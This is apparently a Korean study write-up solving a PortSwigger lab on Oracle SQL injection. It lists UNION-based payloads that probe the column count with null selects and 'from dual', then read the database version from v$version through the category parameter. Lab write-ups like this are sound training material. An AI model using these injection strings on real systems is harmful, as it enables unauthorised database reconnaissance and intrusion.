# [PortSwigger]SQL Injection 07

https://portswigger.net/web-security/all-labs

## LAB
SQL 주입 공격, Oracle에서 데이터베이스 유형 및 버전 쿼리

## Qusetion
이 연구소에는 제품 범주 필터에 SQL 삽입 취약점이 포함되어 있습니다. UNION 공격을 사용하여 주입된 쿼리에서 결과를 검색할 수 있습니다.

랩을 해결하려면 데이터베이스 버전 문자열을 표시하십시오

## Solution

ORACLE 데이터베이스 확인

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2007%20-%201.png)

<br>

제품 범주 필터에 Union SQL Injection 취약점 확인

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2006%20-%201.png)

<br>

category 파라미터에 취약점 확인
```
' union select null --
' union select null,null --
' union select null from dual --
' union select null,null from dual --
```

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2007%20-%202.png)

<br>

oracle 버전 정보 출력 구문 삽입
```
' union select null,banner from v$version --
```

![](../img/Study%20Img/%5BPortSwigger%5DSQL%20Injection%2007%20-%203.png)